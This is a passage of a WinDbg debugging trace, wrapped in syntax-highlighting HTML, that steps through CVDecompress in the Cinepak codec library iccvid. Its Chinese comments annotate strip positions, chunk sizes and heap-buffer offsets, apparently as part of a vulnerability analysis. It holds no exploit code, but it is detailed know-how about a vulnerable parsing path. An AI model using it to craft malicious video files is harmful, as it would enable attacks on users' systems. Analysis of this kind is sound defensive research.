class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6906=<span class="number">00</span> <span class="comment">; ch = 0x00,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690b=<span class="number">60</span> <span class="comment">; al = 0x60,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6907=<span class="number">00</span> <span class="comment">; cl = 0x00,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=00ba68f8 <span class="comment">; a2 = eax = 0x60 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; eax = 0x00000000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">1</span>] <span class="comment">; 为0则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722d1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x123</span>:</span><br><span class="line">73b722d1 8b7df4          <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6902 <span class="comment">; edi = [ebp-0xC] = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba6902</span><br><span class="line"><span class="built_in">eip</span>=73b722d4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x126</span>:</span><br><span class="line">73b722d4 8b4320          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">20h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d0=001535f8 <span class="comment">; ebx = a1 = 0x001535b0,eax = 0x001535f8,堆缓冲区数据区域首地址</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba6902</span><br><span class="line"><span class="built_in">eip</span>=73b722d7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x129</span>:</span><br><span class="line">73b722d7 83c70c          <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="number">0Ch</span>                                        <span class="comment">; edi = edi+0xC = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722da <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12c</span>:</span><br><span class="line">73b722da 0345fc          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; eax = 0x001535f8(堆缓冲区数据区域首地址),[ebp-4] = 0x0(堆缓冲区指针偏移)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722dd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12f</span>:</span><br><span class="line">73b722dd 8d4e0c          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">esi</span>+<span class="number">0Ch</span>]                                  <span class="comment">; ecx = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x132</span>:</span><br><span class="line">73b722e0 <span class="number">894338</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=<span class="number">00000000</span> <span class="comment">; eax = 0x001535f8,堆缓冲区数据区域首地址</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x135</span>:</span><br><span class="line">73b722e3 8b4520          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x138</span>:</span><br><span class="line">73b722e6 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6902 <span class="comment">; [ebp-18h] = ecx = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13b</span>:</span><br><span class="line">73b722e9 89433c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">3Ch</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535ec=<span class="number">00000000</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722ec <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13e</span>:</span><br><span class="line">73b722ec e9be000000      <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x201</span> (73b723af)</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">1</span>] <span class="comment">; 大于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x143</span>:</span><br><span class="line">73b722f1 0fb64103        <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6911=<span class="number">00</span> <span class="comment">; ecx = 0x00ba690e,指向第1个CVID Chunk ID,eax = 0x00,Size of chunk data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x147</span>:</span><br><span class="line">73b722f5 33d2            <span class="keyword">xor</span>     <span class="built_in">edx</span>,<span class="built_in">edx</span>                                        <span class="comment">; edx = edx^edx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span 